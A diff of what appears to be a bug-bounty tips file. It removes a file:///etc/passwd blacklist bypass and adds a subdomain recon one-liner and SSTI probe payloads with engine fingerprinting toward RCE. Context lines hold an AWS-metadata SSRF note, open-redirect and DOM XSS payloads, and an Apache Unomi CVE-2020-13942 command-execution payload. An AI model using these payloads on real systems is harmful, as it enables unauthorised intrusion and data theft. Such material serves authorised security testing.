@@ -27,11 +27,6 @@ Now attacker can register a domain with Fastly and use HHI to ATO using forgot p
 ```
 ***Note :*** This code is to fetch aws metadata you can edit the location to your target location. For more info **https://medium.com/techfenix/ssrf-server-side-request-forgery-worth-4913-my-highest-bounty-ever-7d733bb368cb** 
 
-📅 12-Nov-2020
-## Browser-Based application LFI
-`file:///etc/passwd` blacklisted? Use `view-source:file:///etc/passwd`
-"view-source" is often forgotten by developers in blacklists.
-
 📅 16-Nov-2020
 ## Check for open redirect,ssrf with waybackurls
 ```sh
@@ -46,6 +41,7 @@ apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ |
 ```sh
 xargs -P 500 -a domain -I@ sh -c 'nc -w1 -z -v @ 443 2>/dev/null && echo @' | xargs -I@ -P10 sh -c 'gospider -a -s "https://@" -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s#\] \- #\n#g" | anew'
 ```
+
 📅 17-Nov-2020
 ## OPen redirect Bypass payloads
 ```text
@@ -72,3 +68,16 @@ DOM XSS via $.append(<PAYLOAD>)
 {"filters":[{"id" : "pyn3rd","filters": [{"condition": {"parameterValues": {"pyn3rd": "script::Runtime.getRuntime().exec('open -a Calculator')"},"type":"profilePropertyCondition"}}]}],"sessionId": "pyn3rd"}
 ```
 - [Proof of Concept](img/-%20CVE-2020-13942%20Apache%20Unomi%20Remote%20Code%20Execution__PoC__%7B_filters___%7B_id_%20_%20_py.mp4)
+
+📅 22-Nov-2020
+## 🔥Using dnsgen to find new domains from a list of domains, I used amass on the list (army1).
+🔥 xargs -a army1 -I@ sh -c 'echo @' | dnsgen - | httpx -silent -threads 1000 🔥
+#Bugbounty #bugbountytips #recon #github #KingOfBugBountyTips
+## SSTI
+If your username and last name fields are vulnerable to HTML injection, try SSTI vulnerability too! 
+SSTI can be made with RCE. This is a typical SSTI Payload.
+`{{ '7'*7 }}`
+We need to identify what template engine is used in the back-end as well to exploit further to get RCE.
+- `if {{ 7*'7′ }} -> 7777777` -> Its Jinja2 Engine
+- `if {{ 7*'7′ }} -> 49` -> Its Twig Engine
+#bugbountytips
